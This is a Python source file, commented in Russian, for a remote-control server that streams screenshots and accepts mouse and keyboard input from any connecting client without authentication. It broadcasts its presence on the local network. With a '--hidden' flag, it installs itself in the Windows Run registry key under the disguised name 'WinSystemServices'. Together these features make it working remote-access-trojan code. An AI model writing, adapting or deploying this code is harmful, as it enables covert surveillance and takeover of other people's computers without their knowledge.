import socket
import threading
import zlib
import os
import sys
import time
import pyautogui
from io import BytesIO

# Проверка и выбор библиотеки для скриншотов
try:
    import cv2
    import numpy as np
    USE_CV2 = True
    print("Используется OpenCV для скриншотов")
except ImportError:
    USE_CV2 = False
    print("ВНИМАНИЕ: OpenCV не найден! Используем PIL для скриншотов")
    try:
        from PIL import Image
        import numpy as np
    except ImportError:
        print("ОШИБКА: Ни OpenCV, ни PIL не найдены!")
        sys.exit(1)


SERVER_PORT = 5555
DISCOVERY_PORT = 5556
DISCOVERY_MESSAGE = "UA_HORIZON_SERVER"
ALLOWED_IPS = []
SCREENSHOT_QUALITY = 70
SCREENSHOT_INTERVAL = 0.5
clients_lock = threading.Lock()
connected_clients = []


def broadcast_server():
    """Отправляет UDP广播 каждые 2-3 секунды"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(("", DISCOVERY_PORT))
    except:
        pass
    
    while True:
        try:
            sock.sendto(DISCOVERY_MESSAGE.encode('utf-8'), ('255.255.255.255', DISCOVERY_PORT))
            time.sleep(2.5)
        except Exception as e:
            print(f"Ошибка broadcast: {e}")
            time.sleep(5)


def get_system_info():
    import platform
    import socket as sock
    pc_name = sock.gethostname()
    os_version = platform.platform()
    return f"{pc_name}|{os_version}"


def auto_run():
    try:
        import winreg
        exe_path = os.path.abspath(sys.executable)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinSystemServices", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass


def handle_client(client_socket, addr):
    with clients_lock:
        connected_clients.append((addr[0], time.strftime('%H:%M:%S')))
    try:
        client_socket.sendall(f"INFO:{get_system_info()}".encode('utf-8'))
    except:
        pass
    
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break
            
            try:
                message = data.decode('utf-8')
            except UnicodeDecodeError:
                continue
            
            if message.startswith("MOUSE:"):
                parts = message[6:].split(",")
                if len(parts) >= 3:
                    try:
                        action = parts[0]
                        x, y = int(parts[1]), int(parts[2])
                        
                        if action == "LEFT_DOWN":
                            pyautogui.mouseDown(x, y, button='left')
                        elif action == "LEFT_UP":
                            pyautogui.mouseUp(x, y, button='left')
                        elif action == "RIGHT_DOWN":
                            pyautogui.mouseDown(x, y, button='right')
                        elif action == "RIGHT_UP":
                            pyautogui.mouseUp(x, y, button='right')
                        elif action == "MOVE":
                            pyautogui.moveTo(x, y)
                        elif action == "CLICK":
                            pyautogui.click(x, y, button='left')
                        elif action == "RIGHT_CLICK":
                            pyautogui.click(x, y, button='right')
                    except (ValueError, Exception) as e:
                        print(f"Ошибка мыши: {e}")
            
            elif message.startswith("click:"):
                parts = message[6:].split(":")
                if len(parts) >= 2:
                    try:
                        x, y = int(parts[0]), int(parts[1])
                        pyautogui.click(x, y, button='left')
                        print(f"Клик: {x}, {y}")
                    except (ValueError, Exception) as e:
                        print(f"Ошибка click:x:y: {e}")
            
            elif message.startswith("KEY:"):
                key_data = message[4:]
                try:
                    if key_data == "ENTER":
                        pyautogui.press('enter')
                    elif key_data == "TAB":
                        pyautogui.press('tab')
                    elif key_data == "ESC":
                        pyautogui.press('esc')
                    elif key_data == "BACKSPACE":
                        pyautogui.press('backspace')
                    elif key_data == "SPACE":
                        pyautogui.press('space')
                    elif key_data.startswith("TEXT:"):
                        text = key_data[5:]
                        pyautogui.write(text)
                    else:
                        pyautogui.press(key_data.lower())
                except Exception as e:
                    print(f"Ошибка клавиатуры: {e}")
            
            elif message == "PING":
                try:
                    client_socket.sendall(b"PONG")
                except:
                    break
                    
        except ConnectionResetError:
            break
        except Exception as e:
            print(f"Ошибка: {e}")
            break
    
    try:
        client_socket.close()
    except:
        pass
    with clients_lock:
        for i, (ip, _) in enumerate(connected_clients):
            if ip == addr[0]:
                connected_clients.pop(i)
                break


def send_screenshots(client_socket):
    """Отправка скриншотов клиенту с поддержкой cv2 и PIL"""
    while True:
        try:
            if USE_CV2:
                # Используем OpenCV (быстрее)
                screenshot = pyautogui.screenshot()
                img_array = np.array(screenshot)
                img_bgr = cv2.cvtColor(img_array, cv2.COLOR_RGB2BGR)
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), SCREENSHOT_QUALITY]
                result, encoded_img = cv2.imencode('.jpg', img_bgr, encode_param)
            else:
                # Используем PIL как запасной вариант
                screenshot = pyautogui.screenshot()
                buffer = BytesIO()
                screenshot.save(buffer, format='JPEG', quality=SCREENSHOT_QUALITY)
                encoded_img = np.frombuffer(buffer.getvalue(), dtype=np.uint8)
                result = True
            
            if not result:
                continue
                
            image_data = encoded_img.tobytes()
            compressed = zlib.compress(image_data, level=6)
            
            size = len(compressed)
            try:
                client_socket.sendall(size.to_bytes(4, byteorder='big'))
                client_socket.sendall(compressed)
            except:
                break
            
        except Exception as e:
            print(f"Ошибка скриншота: {e}")
            break
        
        time.sleep(SCREENSHOT_INTERVAL)


def client_handler(client_socket, addr):
    try:
        if ALLOWED_IPS and addr[0] not in ALLOWED_IPS:
            client_socket.sendall(f"BLOCKED:IP not allowed".encode('utf-8'))
            client_socket.close()
            return
        
        client_socket.sendall(b"CONNECTED")
        
        handler_thread = threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True)
        handler_thread.start()
        
        send_screenshots(client_socket)
        
    except Exception as e:
        print(f"Ошибка обработки клиента: {e}")
    finally:
        try:
            client_socket.close()
        except:
            pass


def print_clients():
    with clients_lock:
        if not connected_clients:
            print("Нет подключённых клиентов.")
        else:
            print("Подключённые клиенты:")
            for ip, t in connected_clients:
                print(f"  {ip} (подключён в {t})")


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
        auto_run()
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(("0.0.0.0", SERVER_PORT))
        server.listen(5)
        print(f"Сервер запущен на порту {SERVER_PORT}")
    except Exception as e:
        print(f"Не удалось запустить: {e}")
        return
    
    # Запуск UDP broadcasting для автообнаружения
    threading.Thread(target=broadcast_server, daemon=True).start()
    threading.Thread(target=console_commands, daemon=True).start()
    while True:
        try:
            client_socket, addr = server.accept()
            print(f"Подключение от {addr[0]}")
            
            thread = threading.Thread(target=client_handler, args=(client_socket, addr), daemon=True)
            thread.start()
            
        except KeyboardInterrupt:
            print("Сервер остановлен")
            break
        except Exception as e:
            print(f"Ошибка: {e}")
            continue
    
    server.close()


def console_commands():
    while True:
        cmd = input().strip().lower()
        if cmd == "clients" or cmd == "list":
            print_clients()
        elif cmd == "exit":
            print("Выход из консоли...")
            os._exit(0)
        else:
            print("Доступные команды: clients (list), exit")


if __name__ == "__main__":
    main()
